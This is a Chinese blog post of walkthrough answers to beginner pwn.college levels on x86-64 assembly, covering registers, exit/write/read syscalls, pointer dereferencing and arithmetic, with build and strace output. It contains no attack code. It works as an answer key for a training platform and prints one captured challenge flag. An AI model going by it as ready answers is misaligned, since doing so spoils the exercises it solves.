<!DOCTYPE html>
<html lang="zn-CN">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="Lobo Q1ng">


    <meta name="subtitle" content="天空是为蓝色~">




<title>pwn.college 题解 | Lobo Q1ng&#39;s Blog</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 7.3.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">Q1ng&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">Q1ng&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // 为 6 时展开所有
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">pwn.college 题解</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">Lobo Q1ng</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">March 1, 2025&nbsp;&nbsp;0:58:42</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/Pwn/">Pwn</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h1 id="Getting-Started"><a href="#Getting-Started" class="headerlink" title="Getting Started"></a>Getting Started</h1><h2 id="Computing-101"><a href="#Computing-101" class="headerlink" title="Computing 101"></a>Computing 101</h2><h3 id="Your-First-Program"><a href="#Your-First-Program" class="headerlink" title="Your First Program"></a>Your First Program</h3><h4 id="Your-First-Register"><a href="#Your-First-Register" class="headerlink" title="Your First Register"></a>Your First Register</h4><p>这道题的要求是讲值60移动到<code>rax</code>寄存器中。并将汇编代码放进某个.s文件中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rax,0x3c</span><br></pre></td></tr></table></figure>

<p>比较简单</p>
<h4 id="Your-First-Syscall"><a href="#Your-First-Syscall" class="headerlink" title="Your First Syscall"></a>Your First Syscall</h4><p>这道题通过将系统调用号为60传给eax，并执行系统调用指令<code>systemcall</code>，来调用exit</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rax,60</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>



<h4 id="Exit-Codes"><a href="#Exit-Codes" class="headerlink" title="Exit Codes"></a>Exit Codes</h4><p>依然是调用指令，但是退出代码要求为42。42作为参数，那么系统调用的第一个参数通过rdi寄存器传递。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rdi,42</span><br><span class="line">mov rax,60</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>



<h4 id="Building-Executables"><a href="#Building-Executables" class="headerlink" title="Building Executables"></a>Building Executables</h4><p>要构建可执行二进制文件，步骤如下：</p>
<ol>
<li>将程序集写入文件（通常带有.s或.S语法）</li>
<li>将二进制文件汇编到可执行对象文件中（使用as命令）</li>
<li>将一个或多个可执行对象文件链接到最终的可执行二进制文件中（使用ld命令）</li>
</ol>
<p>使用Intel汇编语法，要让汇编者知道这一点。为此，再汇编代码的开头加上一个指令，如下所示（以上一个level的代码为例）。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">mov rdi,42</span><br><span class="line">mov rax,60</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>

<p><code>.intel_syntax noprefix</code>会告诉汇编器使用Intel汇编语法，特别是它的变体，从而不必为每个指令添加额外的前缀。</p>
<p>接下来分别使用as命令和ld命令来构建可执行二进制文件</p>
<p><code>as -o asm.o asm.s</code> 和 <code>ld -o exe asm.o</code>这将创建一个exe文件，随后可以运行该文件。</p>
<blockquote>
<p>ld命令：link editor</p>
<p>在典型的开发工作流程中，编译源代码并将汇编代码汇编成目标文件，通常有很多这样的文件（通常，程序中的每个源代码文件都编译成自己的目标文件）。然后，这些内容将<strong>链接</strong>在一起，形成一个可执行文件。即使只有一个文件我们仍然需要链接它，以准备最终的可执行文件。这是通过ld命令完成的。</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hacker@your-first-program~exit-codes:~$ as -o hello.o hello.s</span><br><span class="line">hacker@your-first-program~exit-codes:~$ ld -o exe hello.o</span><br><span class="line">/nix/store/q3sm4x963a996qc3d6baw54609ryifak-binutils-2.41/bin/ld: warning: cannot find entry symbol _start; defaulting to 0000000000401000</span><br></pre></td></tr></table></figure>

<p>这里会有一个<code>_start</code>警告，这是因为ld会打印有关输入符号<code>_start</code>的警告。<code>_start</code>符号本质上是给ld的注释，说明在执行ELF时程序执行应该从何处开始。该警告指出，如果没有指定的<code>_start</code>，执行将从代码的开头开始。这对我们来说很好！</p>
<p>如果不希望出现这个警告，那么可以修改成：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">mov rdi,42</span><br><span class="line">mov rax,60</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>

<p>第二个<code>_start</code>标签指向代码的开头，第一个<code>.global _start</code>指示这个标签在链接器级别<strong>全局可见</strong>，而不仅仅是在对象文件级别本地可见。</p>
<h4 id="Tracing-Syscalls"><a href="#Tracing-Syscalls" class="headerlink" title="Tracing Syscalls"></a>Tracing Syscalls</h4><p>调试程序的工具和技术：<strong>strace</strong></p>
<p>用法：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hacker@dojo:~$ strace /tmp/your-program</span><br><span class="line">execve(&quot;/tmp/your-program&quot;, [&quot;/tmp/your-program&quot;], 0x7ffd48ae28b0 /* 53 vars */) = 0</span><br><span class="line">exit(42)                                 = ?</span><br><span class="line">+++ exited with 42 +++</span><br><span class="line">hacker@dojo:~$</span><br></pre></td></tr></table></figure>



<p>这道题的exp:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hacker@your-first-program~tracing-syscalls:~$ strace /challenge/trace-me </span><br><span class="line">execve(&quot;/challenge/trace-me&quot;, [&quot;/challenge/trace-me&quot;], 0x7ffc5d085500 /* 26 vars */) = 0</span><br><span class="line">alarm(6398)                             = 0</span><br><span class="line">exit(0)                                 = ?</span><br><span class="line">+++ exited with 0 +++</span><br><span class="line">hacker@your-first-program~tracing-syscalls:~$ /challenge/submit-number 6398</span><br><span class="line">CORRECT! Here is your flag:</span><br><span class="line">pwn.college&#123;wHIzj1noGySkn_Bsyfc41LKkCc3.dFzN4UDLxYTN1YzW&#125;</span><br></pre></td></tr></table></figure>



<h4 id="Moving-Between-Registers"><a href="#Moving-Between-Registers" class="headerlink" title="Moving Between Registers"></a>Moving Between Registers</h4><p><code>rsi</code>寄存器，像<code>rdi</code>寄存器一样能存东西。</p>
<p>这道题要将rsi的值作为exit系统调用的代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">mov rdi, rsi</span><br><span class="line">mov rax, 60</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>



<h3 id="Computer-Memory"><a href="#Computer-Memory" class="headerlink" title="Computer Memory"></a>Computer Memory</h3><h4 id="Loading-From-Memory"><a href="#Loading-From-Memory" class="headerlink" title="Loading From Memory"></a>Loading From Memory</h4><p>从内存中加载数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">mov rdi, [133700]	# 从内存[0x133700]处获得数据，存于rdi寄存器中</span><br><span class="line">mov rax, 60</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>



<h4 id="More-Loading-Practice"><a href="#More-Loading-Practice" class="headerlink" title="More Loading Practice"></a>More Loading Practice</h4><p>同样的从内存中加载数据</p>
<h4 id="Dereferencing-Pointers"><a href="#Dereferencing-Pointers" class="headerlink" title="Dereferencing Pointers"></a>Dereferencing Pointers</h4><p>rax解引用，将rax存储的地址取出，并将这个地址所指向的值赋予rdi寄存器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">mov rdi, [rax]</span><br><span class="line">mov rax, 60</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>



<h4 id="Dereferencing-Yourself"><a href="#Dereferencing-Yourself" class="headerlink" title="Dereferencing Yourself"></a>Dereferencing Yourself</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">mov rdi, [rdi]</span><br><span class="line">mov rax, 60</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>



<h4 id="Dereferencing-with-Offsets"><a href="#Dereferencing-with-Offsets" class="headerlink" title="Dereferencing with Offsets"></a>Dereferencing with Offsets</h4><p>说明：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  Address │ Contents</span><br><span class="line">+────────────────────+</span><br><span class="line">│ 133700  │ 50       │◂┐</span><br><span class="line">│ 133701  │ 42       │ │</span><br><span class="line">│ 133702  │ 99       │ │</span><br><span class="line">│ 133703  │ 14       │ │</span><br><span class="line">+────────────────────+ │</span><br><span class="line">                       │</span><br><span class="line"> Register │ Contents   │</span><br><span class="line">+────────────────────+ │</span><br><span class="line">│ rdi     │ 133700   │─┘</span><br><span class="line">+────────────────────+</span><br></pre></td></tr></table></figure>

<p>如果我想获取42这个数字，那么可以：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rax, [rdi+1]</span><br></pre></td></tr></table></figure>

<p>最终的exp：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">mov rdi, [rdi+8]</span><br><span class="line">mov rax, 60</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>



<h4 id="Stored-Address"><a href="#Stored-Address" class="headerlink" title="Stored Address"></a>Stored Address</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">mov rdi, [567800]</span><br><span class="line">mov rdi, [rdi]</span><br><span class="line">mov rax, 60</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>



<h4 id="Double-Dereference"><a href="#Double-Dereference" class="headerlink" title="Double Dereference"></a>Double Dereference</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">mov rdi, [rax]</span><br><span class="line">mov rdi, [rdi]</span><br><span class="line">mov rax, 60</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>



<h4 id="Triple-Dereference"><a href="#Triple-Dereference" class="headerlink" title="Triple Dereference"></a>Triple Dereference</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">mov rdi, [rdi]</span><br><span class="line">mov rdi, [rdi]</span><br><span class="line">mov rdi, [rdi]</span><br><span class="line">mov rax, 60</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>



<h3 id="Hello-Hackers"><a href="#Hello-Hackers" class="headerlink" title="Hello Hackers"></a>Hello Hackers</h3><h4 id="Writing-Output"><a href="#Writing-Output" class="headerlink" title="Writing Output"></a>Writing Output</h4><p><code>write</code>系统调用的<code>syscall</code>编号为1。但是write系统调用还需要通过其参数指定要写入的数据以及将其写入的位置。</p>
<p><code>write</code>系统调用通过获取两个参数，即分别代表开始写入和要写入多少个字符。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write(file_descriptor, memory_address, number_of_characters_to_write)</span><br></pre></td></tr></table></figure>

<p>其中，rdi寄存器传递系统调用的第一个参数。<strong>rsi寄存器传递第二个参数，rdx寄存器传递第三个参数。</strong></p>
<p>exp:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">mov rdi, 1</span><br><span class="line">mov rsi, 1337000</span><br><span class="line">mov rdx, 1</span><br><span class="line">mov rax, 1</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>



<h4 id="Chaining-Syscalls"><a href="#Chaining-Syscalls" class="headerlink" title="Chaining Syscalls"></a>Chaining Syscalls</h4><p>正确退出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">mov rdi, 1</span><br><span class="line">mov rsi, 1337000</span><br><span class="line">mov rdx, 1</span><br><span class="line">mov rax, 1</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov rdi, 42</span><br><span class="line">mov rax, 60</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>





<h4 id="Writing-Strings"><a href="#Writing-Strings" class="headerlink" title="Writing Strings"></a>Writing Strings</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">mov rdi, 1</span><br><span class="line">mov rsi, 1337000</span><br><span class="line">mov rdx, 14</span><br><span class="line">mov rax, 1</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov rdi, 42</span><br><span class="line">mov rax, 60</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>



<h4 id="Reading-Data"><a href="#Reading-Data" class="headerlink" title="Reading Data"></a>Reading Data</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">mov rdi, 0</span><br><span class="line">mov rsi, 1337000</span><br><span class="line">mov rdx, 8</span><br><span class="line">mov rax, 0</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov rdi, 1</span><br><span class="line">mov rsi, 1337000</span><br><span class="line">mov rdx, 8</span><br><span class="line">mov rax, 1</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov rdi, 42</span><br><span class="line">mov rax, 60</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>



<h3 id="Assembly-Crash-Course"><a href="#Assembly-Crash-Course" class="headerlink" title="Assembly Crash Course"></a>Assembly Crash Course</h3><h4 id="set-register"><a href="#set-register" class="headerlink" title="set-register"></a>set-register</h4><p>要求：<code>rdi = 0x1337</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">mov rdi, 0x1337</span><br></pre></td></tr></table></figure>



<h4 id="set-multiple-registers"><a href="#set-multiple-registers" class="headerlink" title="set-multiple-registers"></a>set-multiple-registers</h4><p>In this level, you will work with multiple registers. Please set the following:</p>
<ul>
<li><code>rax = 0x1337</code></li>
<li><code>r12 = 0xCAFED00D1337BEEF</code></li>
<li><code>rsp = 0x31337</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">mov rax, 0x1337</span><br><span class="line">mov r12, 0xCAFED00D1337BEEF</span><br><span class="line">mov rsp, 0x31337</span><br></pre></td></tr></table></figure>



<h4 id="add-to-register"><a href="#add-to-register" class="headerlink" title="add-to-register"></a>add-to-register</h4><p>Do the following:</p>
<ul>
<li>Add <code>0x331337</code> to <code>rdi</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">add rdi, 0x331337</span><br></pre></td></tr></table></figure>



<h4 id="linear-equation-registers"><a href="#linear-equation-registers" class="headerlink" title="linear-equation-registers"></a>linear-equation-registers</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">imul rdi, rsi</span><br><span class="line">add rdx, rdi</span><br><span class="line">mov rax, rdx</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="integer-division"><a href="#integer-division" class="headerlink" title="integer-division"></a>integer-division</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">mov rax, rdi</span><br><span class="line">div rsi</span><br></pre></td></tr></table></figure>



<h4 id="modulo-operation"><a href="#modulo-operation" class="headerlink" title="modulo-operation"></a>modulo-operation</h4><p>div操作之后，余数会被存于rdx(dx)中。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">mov rax, rdi</span><br><span class="line">div rsi</span><br><span class="line">mov rax, rdx</span><br></pre></td></tr></table></figure>



<h4 id="set-upper-byte"><a href="#set-upper-byte" class="headerlink" title="set-upper-byte"></a>set-upper-byte</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MSB                                    LSB</span><br><span class="line">+----------------------------------------+</span><br><span class="line">|                   rax                  |</span><br><span class="line">+--------------------+-------------------+</span><br><span class="line">                     |        eax        |</span><br><span class="line">                     +---------+---------+</span><br><span class="line">                               |   ax    |</span><br><span class="line">                               +----+----+</span><br><span class="line">                               | ah | al |</span><br><span class="line">                               +----+----+</span><br></pre></td></tr></table></figure>

<p>Using only one move instruction, please set the upper 8 bits of the <code>ax</code> register to <code>0x42</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">mov ah, 0x42</span><br></pre></td></tr></table></figure>



<h4 id="efficient-modulo"><a href="#efficient-modulo" class="headerlink" title="efficient-modulo"></a>efficient-modulo</h4><p>Using only the following instruction(s):</p>
<ul>
<li><code>mov</code></li>
</ul>
<p>Please compute the following:</p>
<ul>
<li><code>rax = rdi % 256</code></li>
<li><code>rbx = rsi % 65536</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">mov rcx, rdi</span><br><span class="line">mov al, cl</span><br><span class="line">mov rdx, rsi</span><br><span class="line">mov bx, dx</span><br></pre></td></tr></table></figure>



<h4 id="byte-extraction"><a href="#byte-extraction" class="headerlink" title="byte-extraction"></a>byte-extraction</h4><p><code>shl</code>指令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">;rax = 10001010</span><br><span class="line">shl al, 1</span><br><span class="line">;al = 00010100</span><br></pre></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">shr rdi, 32</span><br><span class="line">mov rbx, rdi</span><br><span class="line">mov al, bl</span><br></pre></td></tr></table></figure>



<h4 id="bitwise-and"><a href="#bitwise-and" class="headerlink" title="bitwise-and"></a>bitwise-and</h4><p>如果不使用以下说明：<code>mov</code>、<code>xchg</code>，请执行以下操作：<br>将 <code>rax</code> 设置为 <code>（rdi AND rsi）</code> 的值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">and rdi, rsi</span><br><span class="line">and rax, 0</span><br><span class="line">xor rax, rdi</span><br></pre></td></tr></table></figure>





<h4 id="check-even"><a href="#check-even" class="headerlink" title="check-even"></a>check-even</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">    and rdi, 1</span><br><span class="line">    and rax, 1</span><br><span class="line">    xor rax, rdi</span><br></pre></td></tr></table></figure>



